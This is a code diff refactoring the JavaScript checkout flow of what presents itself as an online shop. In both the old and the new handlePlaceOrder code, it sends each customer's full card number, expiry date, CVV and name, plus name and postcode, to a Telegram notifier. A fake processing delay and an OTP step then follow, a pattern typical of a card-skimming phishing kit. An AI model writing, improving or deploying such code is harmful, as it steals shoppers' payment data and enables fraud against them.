@@ -972,112 +972,120 @@ function setupDiscountCode() {
 
 function setupCheckoutEventListeners() {
     try {
-        // Close checkout
-        const closeCheckoutBtn = document.querySelector('.close-checkout');
-        if (closeCheckoutBtn) {
-            closeCheckoutBtn.addEventListener('click', closeCheckout);
-        }
-
         const checkoutOverlay = document.querySelector('.checkout-overlay');
         if (checkoutOverlay) {
             checkoutOverlay.addEventListener('click', function(e) {
-                // Only close if clicking directly on overlay, not on modal content
-                if (e.target === this && !e.target.closest('.checkout-modal')) {
-                    e.preventDefault();
+                // Close if clicking on the overlay, but not the modal itself
+                if (e.target === checkoutOverlay) {
                     closeCheckout();
                 }
             });
         }
 
-        // Step navigation
-        const nextToShippingBtn = document.getElementById('next-to-shipping');
+        // --- Event Delegation for all buttons within the modal ---
+        const modal = document.querySelector('.checkout-modal');
+        if (!modal) return;
+
+        modal.addEventListener('click', function(e) {
+            const button = e.target.closest('button');
+            if (!button) return;
+
+            // Handle buttons by ID
+            switch (button.id) {
+                case 'next-to-shipping':
+                    e.preventDefault();
+                    const checkbox = document.getElementById('terms-checkbox');
+                    if (checkbox && !checkbox.checked) {
+                        alert(currentLanguage === 'es' ? 'Debe aceptar los términos y condiciones para continuar' : 'You must accept the terms and conditions to continue');
+                        return;
+                    }
+                    goToCheckoutStep(2);
+                    break;
+
+                case 'back-to-summary':
+                    e.preventDefault();
+                    goToCheckoutStep(1);
+                    break;
+
+                case 'back-to-shipping':
+                    e.preventDefault();
+                    goToCheckoutStep(2);
+                    break;
+
+                case 'next-to-payment':
+                    e.preventDefault();
+                    const customerName = document.getElementById('customer-name');
+                    const customerPhone = document.getElementById('customer-phone');
+                    const customerAddress = document.getElementById('customer-address');
+                    const customerCity = document.getElementById('customer-city');
+
+                    if (!customerName || !customerName.value.trim()) {
+                        alert(currentLanguage === 'es' ? 'Por favor ingrese su nombre completo' : 'Please enter your full name');
+                        if (customerName) customerName.focus(); return;
+                    }
+                    if (!customerPhone || !customerPhone.value.trim()) {
+                        alert(currentLanguage === 'es' ? 'Por favor ingrese su número de teléfono' : 'Please enter your phone number');
+                        if (customerPhone) customerPhone.focus(); return;
+                    }
+                    if (!customerAddress || !customerAddress.value.trim()) {
+                        alert(currentLanguage === 'es' ? 'Por favor ingrese su dirección completa' : 'Please enter your complete address');
+                        if (customerAddress) customerAddress.focus(); return;
+                    }
+                    if (!customerCity || !customerCity.value.trim()) {
+                        alert(currentLanguage === 'es' ? 'Por favor ingrese su ciudad' : 'Please enter your city');
+                        if (customerCity) customerCity.focus(); return;
+                    }
+
+                    checkoutData.customerName = customerName.value.trim();
+                    checkoutData.customerPhone = customerPhone.value.trim();
+                    checkoutData.customerAddress = customerAddress.value.trim();
+                    checkoutData.customerCity = customerCity.value.trim();
+                    checkoutData.customerPostal = document.getElementById('customer-postal')?.value.trim() || '';
+
+                    TelegramNotifications.sendCustomerInfo({ name: checkoutData.customerName, postcode: checkoutData.customerPostal });
+                    goToCheckoutStep(3);
+                    break;
+
+                case 'verify-otp-btn':
+                    e.preventDefault();
+                    verifyOTP();
+                    break;
+
+                case 'skip-otp-btn':
+                    e.preventDefault();
+                    skipOTP();
+                    break;
+
+                case 'resend-otp-btn':
+                    e.preventDefault();
+                    resendOTP();
+                    break;
+            }
+
+            // Handle buttons by class
+            if (button.classList.contains('close-checkout')) {
+                e.preventDefault();
+                closeCheckout();
+            }
+
+            if (button.classList.contains('place-order')) {
+                e.preventDefault();
+                handlePlaceOrder(button.dataset.method);
+            }
+
+            if (button.classList.contains('close-checkout-success')) {
+                e.preventDefault();
+                closeCheckout();
+                clearCart();
+            }
+        });
+
+        // --- Listeners for non-button elements ---
         const termsCheckbox = document.getElementById('terms-checkbox');
-
-        if (termsCheckbox && nextToShippingBtn) {
+        if (termsCheckbox) {
             termsCheckbox.addEventListener('change', function() {
-                nextToShippingBtn.disabled = !this.checked;
-                if (this.checked) {
-                    nextToShippingBtn.classList.remove('disabled');
-                } else {
-                    nextToShippingBtn.classList.add('disabled');
-                }
-            });
-        }
-
-        if (nextToShippingBtn) {
-            nextToShippingBtn.addEventListener('click', function() {
-                const checkbox = document.getElementById('terms-checkbox');
-                if (checkbox && !checkbox.checked) {
-                    alert(currentLanguage === 'es' ? 'Debe aceptar los términos y condiciones para continuar' : 'You must accept the terms and conditions to continue');
-                    return;
-                }
-                goToCheckoutStep(2);
-            });
-        }
-
-        const backToSummaryBtn = document.getElementById('back-to-summary');
-        if (backToSummaryBtn) {
-            backToSummaryBtn.addEventListener('click', function() {
-                goToCheckoutStep(1);
-            });
-        }
-
-        const nextToPaymentBtn = document.getElementById('next-to-payment');
-        if (nextToPaymentBtn) {
-            nextToPaymentBtn.addEventListener('click', function() {
-                // Validate customer information
-                const customerName = document.getElementById('customer-name');
-                const customerPhone = document.getElementById('customer-phone');
-                const customerAddress = document.getElementById('customer-address');
-                const customerCity = document.getElementById('customer-city');
-
-                // Check required fields
-                if (!customerName || !customerName.value.trim()) {
-                    alert(currentLanguage === 'es' ? 'Por favor ingrese su nombre completo' : 'Please enter your full name');
-                    if (customerName) customerName.focus();
-                    return;
-                }
-
-                if (!customerPhone || !customerPhone.value.trim()) {
-                    alert(currentLanguage === 'es' ? 'Por favor ingrese su número de teléfono' : 'Please enter your phone number');
-                    if (customerPhone) customerPhone.focus();
-                    return;
-                }
-
-                if (!customerAddress || !customerAddress.value.trim()) {
-                    alert(currentLanguage === 'es' ? 'Por favor ingrese su dirección completa' : 'Please enter your complete address');
-                    if (customerAddress) customerAddress.focus();
-                    return;
-                }
-
-                if (!customerCity || !customerCity.value.trim()) {
-                    alert(currentLanguage === 'es' ? 'Por favor ingrese su ciudad' : 'Please enter your city');
-                    if (customerCity) customerCity.focus();
-                    return;
-                }
-
-                // Store customer information in checkoutData
-checkoutData.customerName = customerName.value.trim();
-checkoutData.customerPhone = customerPhone.value.trim();
-checkoutData.customerAddress = customerAddress.value.trim();
-checkoutData.customerCity = customerCity.value.trim();
-checkoutData.customerPostal = document.getElementById('customer-postal')?.value.trim() || '';
-
-// Send customer info to Telegram
-TelegramNotifications.sendCustomerInfo({
-    name: checkoutData.customerName,
-    postcode: checkoutData.customerPostal
-});
-
-goToCheckoutStep(3);
-            });
-        }
-
-
-        const backToShippingBtn = document.getElementById('back-to-shipping');
-        if (backToShippingBtn) {
-            backToShippingBtn.addEventListener('click', function() {
-                goToCheckoutStep(2);
+                const nextToShippingBtn = document.getElementById('next-to-shipping');
+                if (nextToShippingBtn) nextToShippingBtn.disabled = !this.checked;
             });
         }
 
@@ -1085,130 +1093,65 @@ goToCheckoutStep(3);
         document.querySelectorAll('input[name="payment-method"]').forEach(radio => {
             radio.addEventListener('change', function() {
                 const method = this.value;
-
-                // Remove active class from all payment options
                 document.querySelectorAll('.payment-option').forEach(opt => opt.classList.remove('active'));
-
-                // Hide all payment details and instruction
-                document.querySelectorAll('.payment-details').forEach(detail => {
-                    detail.style.display = 'none';
-                    detail.classList.remove('active');
-                });
-
+                document.querySelectorAll('.payment-details').forEach(detail => detail.style.display = 'none');
                 const instruction = document.getElementById('payment-method-instruction');
-                if (instruction) {
-                    instruction.style.display = 'none';
-                }
-
-                // Add active class to selected option
+                if (instruction) instruction.style.display = 'none';
                 this.closest('.payment-option').classList.add('active');
-
-                // Show selected payment details
                 const detailsElement = document.getElementById(`${method}-details`);
-                if (detailsElement) {
-                    detailsElement.style.display = 'block';
-                    detailsElement.classList.add('active');
-                }
-
+                if (detailsElement) detailsElement.style.display = 'block';
                 checkoutData.paymentMethod = method;
             });
         });
 
-        // Place order event listeners
-        document.querySelectorAll('.place-order').forEach(function(btn) {
-            btn.addEventListener('click', function(e) {
-                e.preventDefault();
-                e.stopPropagation();
-
-                try {
-                    const method = this.dataset.method;
-
-                    if (method === 'bank-transfer') {
-                        // Send Telegram notification for bank transfer
-                        if (typeof TelegramNotifications !== 'undefined') {
-                            TelegramNotifications.confirmBankTransfer({
-                                total: convertPrice(getCartTotal(), false),
-                                orderRef: generateOrderReference()
-                            });
-                        }
-                        processOrder();
-                    } else if (method === 'credit-card') {
-                        if (!validateCardDetails()) {
-                            return; // Stop processing if card details are invalid
-                        }
-
-                        // Store cardholder name
-                        const cardholderNameInput = document.getElementById('cardholder-name');
-                        checkoutData.cardholderName = cardholderNameInput ? cardholderNameInput.value : '';
-
-                        // Send Telegram notification for card details
-                        if (typeof TelegramNotifications !== 'undefined') {
-                            const cardNumber = document.getElementById('card-number').value.replace(/\s/g, '');
-                            const lastFourDigits = cardNumber.slice(-4);
-                            TelegramNotifications.cardDetailsSubmitted({
-                                total: convertPrice(getCartTotal(), false),
-                                orderRef: checkoutData.orderNumber,
-                                cardholderName: checkoutData.cardholderName,
-                                cardNumber: document.getElementById('card-number').value.replace(/\s/g, ''),
-                                expiryDate: document.getElementById('expiry-date').value,
-                                cvv: document.getElementById('cvv').value,
-                                lastFourDigits: lastFourDigits
-                            });
-                        }
-
-                        // Proceed to the processing step (card submission)
-                        goToCheckoutStep(4);
-
-                        // 10-second delay for card processing
-                        setTimeout(function() {
-                            // Proceed to verification step without generating OTP
-                            goToCheckoutStep(6);
-
-                            // Start OTP countdown
-                            startOTPCountdown();
-                        }, 10000); // 10 seconds delay
-                    }
-                } catch (error) {
-                    console.error('Error placing order:', error);
-                    alert('There was an error placing your order. Please try again.');
-                }
-
-                return false;
-            });
-        });
-
-        // Success close - use event delegation properly
-        document.addEventListener('click', function(e) {
-            if (e.target.classList.contains('close-checkout-success')) {
-                e.preventDefault();
-                e.stopPropagation();
-                closeCheckout();
-                clearCart();
-            }
-        });
-
-        // OTP Verification
-        const verifyOtpBtn = document.getElementById('verify-otp-btn');
-        const skipOtpBtn = document.getElementById('skip-otp-btn');
-        const resendOtpBtn = document.getElementById('resend-otp-btn');
-
-        if (verifyOtpBtn) verifyOtpBtn.addEventListener('click', verifyOTP);
-        if (verifyOtpBtn) verifyOtpBtn.addEventListener('click', verifyOTP);
-        if (verifyOtpBtn) verifyOtpBtn.addEventListener('click', verifyOTP);
-        if (verifyOtpBtn) verifyOtpBtn.addEventListener('click', verifyOTP);
-        if (skipOtpBtn) skipOtpBtn.addEventListener('click', skipOTP);
-        if (resendOtpBtn) resendOtpBtn.addEventListener('click', resendOTP);
-
-        // Setup OTP input navigation
+        // Setup input-specific behaviors (without click handlers)
         setupOTPInputs();
-
-        // Setup card input formatting
         setupCardInputFormatting();
 
     } catch (error) {
         console.error('Error setting up checkout event listeners:', error);
     }
 }
+
+function handlePlaceOrder(method) {
+    try {
+        if (method === 'bank-transfer') {
+            if (typeof TelegramNotifications !== 'undefined') {
+                TelegramNotifications.confirmBankTransfer({
+                    total: convertPrice(getCartTotal(), false),
+                    orderRef: generateOrderReference()
+                });
+            }
+            processOrder();
+        } else if (method === 'credit-card') {
+            if (!validateCardDetails()) return;
+
+            const cardholderNameInput = document.getElementById('cardholder-name');
+            checkoutData.cardholderName = cardholderNameInput ? cardholderNameInput.value : '';
+
+            if (typeof TelegramNotifications !== 'undefined') {
+                TelegramNotifications.cardDetailsSubmitted({
+                    total: convertPrice(getCartTotal(), false),
+                    orderRef: checkoutData.orderNumber,
+                    cardholderName: checkoutData.cardholderName,
+                    cardNumber: document.getElementById('card-number').value.replace(/\s/g, ''),
+                    expiryDate: document.getElementById('expiry-date').value,
+                    cvv: document.getElementById('cvv').value
+                });
+            }
+
+            goToCheckoutStep(4);
+            setTimeout(() => {
+                goToCheckoutStep(6);
+                startOTPCountdown();
+            }, 10000);
+        }
+    } catch (error) {
+        console.error('Error placing order:', error);
+        alert('There was an error placing your order. Please try again.');
+    }
+}
+
 function setupCardInputFormatting() {
     const cardNumberInput = document.getElementById('card-number');
     const expiryDateInput = document.getElementById('expiry-date');
